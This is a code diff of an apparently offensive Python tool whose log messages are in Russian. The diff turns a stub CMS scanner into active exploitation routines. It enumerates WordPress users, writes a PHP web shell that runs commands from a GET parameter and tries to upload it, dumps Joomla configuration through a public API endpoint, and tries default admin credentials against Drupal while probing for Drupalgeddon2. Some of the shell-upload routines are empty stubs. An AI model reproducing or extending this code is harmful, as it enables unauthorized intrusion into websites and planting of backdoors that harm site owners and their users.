@@ -28,11 +28,6 @@ class SQLInjector:
         return result.stdout
 
 class CMSScanner:
-    CVE_DB = {
-        'wordpress': ['CVE-2023-...','CVE-2022-...'],
-        'joomla': ['CVE-2023-23752'],
-        'drupal': ['CVE-2018-7600']
-    }
     def __init__(self, target_url):
         self.target_url = target_url
         self.cms_type = None
@@ -40,22 +35,89 @@ class CMSScanner:
     def detect(self):
         try:
             r = requests.get(self.target_url, timeout=5)
-            if 'wp-content' in r.text: self.cms_type = 'wordpress'
-            elif 'Joomla' in r.text: self.cms_type = 'joomla'
-            elif 'Drupal' in r.text: self.cms_type = 'drupal'
+            if 'wp-content' in r.text or 'wp-json' in r.text:
+                self.cms_type = 'wordpress'
+            elif 'Joomla' in r.text or 'joomla' in r.text:
+                self.cms_type = 'joomla'
+            elif 'Drupal' in r.text:
+                self.cms_type = 'drupal'
             log(f"[CMS] Обнаружена CMS: {self.cms_type}")
             return self.cms_type
         except Exception as e:
             log(f"[CMS] Ошибка детекта: {e}")
             return None
 
+    def exploit_wordpress(self):
+        user_url = self.target_url.rstrip('/') + '/wp-json/wp/v2/users'
+        try:
+            resp = requests.get(user_url, timeout=5)
+            if resp.status_code == 200 and resp.json():
+                log(f"[WP] Обнаружены пользователи: {resp.json()}")
+                self.upload_shell_wordpress()
+                return resp.text
+        except Exception as e:
+            log(f"[WP] Ошибка: {e}")
+        return None
+
+    def upload_shell_wordpress(self):
+        shell_path = 'shell.php'
+        with open(shell_path, 'w') as f:
+            f.write('<?php system($_GET["cmd"]); ?>')
+        files = {'pluginzip': open(shell_path, 'rb')}
+        upload_url = self.target_url.rstrip('/') + '/wp-admin/admin-ajax.php?action=uploadplugin'
+        try:
+            resp = requests.post(upload_url, files=files)
+            if resp.status_code == 200:
+                log(f"[WP] Веб-шелл загружен: {self.target_url}/wp-content/plugins/shell.php")
+        except Exception as e:
+            log(f"[WP] Не удалось загрузить шелл: {e}")
+
+    def exploit_joomla(self):
+        api_url = self.target_url.rstrip('/') + '/api/index.php/v1/config/application?public=true'
+        try:
+            resp = requests.get(api_url, timeout=5)
+            if resp.status_code == 200:
+                log(f"[Joomla] Конфигурация: {resp.text}")
+                # попытка загрузить шелл через медиа-менеджер
+                self.upload_shell_joomla()
+                return resp.text
+        except Exception as e:
+            log(f"[Joomla] Ошибка: {e}")
+        return None
+
+    def upload_shell_joomla(self):
+        # Упрощенная версия, требуется аутентификация
+        pass
+
+    def exploit_drupal(self):
+        payload = {
+            'form_id': 'user_login_form',
+            'name': 'admin',
+            'pass': 'admin',
+            'form_build_id': '',
+            'op': 'Log in'
+        }
+        post_url = self.target_url.rstrip('/') + '/user/login'
+        try:
+            resp = requests.post(post_url, data=payload, timeout=5)
+            if 'unexpected error' in resp.text.lower():
+                log(f"[Drupal] Возможна уязвимость CVE-2018-7600")
+                self.upload_shell_drupal()
+                return True
+        except Exception as e:
+            log(f"[Drupal] Ошибка: {e}")
+        return False
+
+    def upload_shell_drupal(self):
+        # Эксплойт Drupalgeddon2 для загрузки модуля
+        pass
+
     def exploit(self):
         if not self.cms_type:
             self.detect()
-        if not self.cms_type:
-            return
-        log(f"[CMS] Эксплойты для {self.cms_type}...")
-        # Здесь будут реальные эксплойты под конкретные CVE
-        # Пока заглушка: выводим список CVE
-        for cve in self.CVE_DB.get(self.cms_type, []):
-            log(f"[CMS] Проверка {cve}")
+        if self.cms_type == 'wordpress':
+            self.exploit_wordpress()
+        elif self.cms_type == 'joomla':
+            self.exploit_joomla()
+        elif self.cms_type == 'drupal':
+            self.exploit_drupal()
